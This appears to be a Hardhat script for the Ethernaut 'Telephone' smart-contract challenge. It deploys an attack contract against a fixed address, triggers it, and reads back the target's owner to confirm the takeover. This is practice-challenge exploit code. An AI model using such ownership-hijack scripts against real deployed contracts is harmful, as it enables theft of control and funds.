
const hre = require("hardhat");

async function main() {

  const Telephone = await hre.ethers.getContractFactory("TelephoneAttack");
  const attack = await Telephone.deploy("0x461bEb5f30306f081391a8d82b8e0A5c33e99802"); /// 0x6dB5ee0314C17790cb8a28E5e565AA5A2817C123
  // const attack = await CoinFlip.attach("0x329BB3818623f50E964D9F806e5C5358b7D8EAd5");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  await attack.attack();

  const Telephone2 = await hre.ethers.getContractFactory("Telephone2");
  const telephone = await Telephone2.attach("0x461bEb5f30306f081391a8d82b8e0A5c33e99802");

  const owner = await telephone.owner()
  console.log("owner", owner);
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
